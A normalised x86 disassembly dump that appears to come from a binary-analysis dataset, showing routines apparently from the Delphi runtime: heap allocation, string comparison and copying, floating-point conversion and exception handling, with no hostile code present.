cmp ebx 0x7ffffff8
jle r-xdata
call sub_401acc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402334
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401428
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_4020c4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401430
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a54
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a54
jmp r-xdata
sub_402348
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_4024da
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401acc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401428
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401430
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a54
jmp r-xdata
call sub_401f60
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401c70
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401ed8
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401c70
sub_4024ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f60
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401c70
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_402064
test al al
je r-xdata
call sub_401c70
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401d34
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401ed8
jmp r-xdata
sub_4026c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_402779
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401acc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4024ec
test al al
je r-xdata
push rw-data
call sub_401428
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4021b8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_402988
mov eax ebx
call sub_402348
retn
push rw-data
call sub_401430
sub_40278c
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_4028e8
sub_4027ac
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_4028e8
sub_4027cc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_4028e8
mov [ ecx ] eax
mov al 0x2
jmp sub_4028e8
retn
mov [ ecx ] eax
retn
sub_40285c
push ebx
push esi
call sub_4060cc
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_4060cc
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_4060cc
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_40289c
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_4060cc
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_402890
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402924
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402988
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4029f8
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402a38
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402914
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402a8c
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402914
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402914
jmp r-xdata
sub_402ae4
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402b20
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_402988
pop ebx
retn
mov ecx ebx
sub_402b3c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402bc0
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c30
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c50
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d30
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402d70
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e23 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e23 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e23
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_40305c
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_40308c
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_401384
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_4030fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40138c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40137c
retn
sub_403180
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403228
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403280
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4049d4
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032a0
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4059b4
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4032d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403354
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403364
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40335b
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032a0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4059b4
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403364
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033a8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403448
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4033e8
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403418
push eax
push ecx
mov eax [ eax ]
call sub_4033e8
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f60
call [ rw-data ]
sub_403430
push esi
mov esi edx
mov eax [ eax ]
call sub_4033e8
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f60
call [ rw-data ]
sub_403478
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4033e8
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034a0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4034f0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403540
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403569
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4035d4
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403610
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403624
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403638
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403658
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403638
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036bc
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403150
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_4060cc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403624
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4035d4
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4037e8
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
